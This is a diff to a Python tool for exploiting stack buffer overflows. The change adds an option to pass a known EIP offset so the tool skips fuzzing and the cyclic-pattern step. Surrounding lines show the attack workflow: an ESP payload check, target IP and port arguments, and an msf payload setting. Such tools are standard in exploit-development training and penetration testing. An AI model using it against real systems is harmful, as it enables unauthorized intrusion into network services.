@@ -244,11 +244,14 @@ def check_esp(offset: int) -> None:
 
 def main() -> None:
     """main function to start the exploit"""
+    global offset
 
-    offset = fuzz()
-    offset = send_cyclic(offset)
+    # if offset is not given from args, then fuzz
+    if offset == 0:
+        offset = fuzz()
+        offset = send_cyclic(offset)
+
     check_esp(offset)
-
     question = input("[?] Is the payload small enough to be sent in ESP (y/n): ").strip()
     payload_in_esp = question.lower() == "y"
 
@@ -272,6 +275,7 @@ if __name__ == "__main__":
     import argparse
 
     parser = argparse.ArgumentParser(description = "Buffer overflow exploit testing tool")
+    parser.add_argument("--offset", help= "eip offset if already known, this will skip offset finding", default = 0)
     parser.add_argument("--prefix", help = "prefix of the string to send", default = "")
     parser.add_argument("--suffix", help = "suffix of the string to send", default = "")
     parser.add_argument("--ip", help = "target ip address", required = True)
@@ -284,7 +288,7 @@ if __name__ == "__main__":
 
     args = parser.parse_args()
 
-    global ip, port, timeout, prefix, suffix, rport, interface, msf, noreceive, newline
+    global ip, port, timeout, prefix, suffix, rport, interface, msf, noreceive, newline, offset
     ip: str = args.ip
     port: int = int(args.port)
     rport: int = int(args.rport)
@@ -295,6 +299,7 @@ if __name__ == "__main__":
     msf: str = args.msf
     noreceive: bool = args.noreceive
     newline: bool = args.newline
+    offset: int = int(args.offset)
 
     if newline:
         suffix += b"\n"
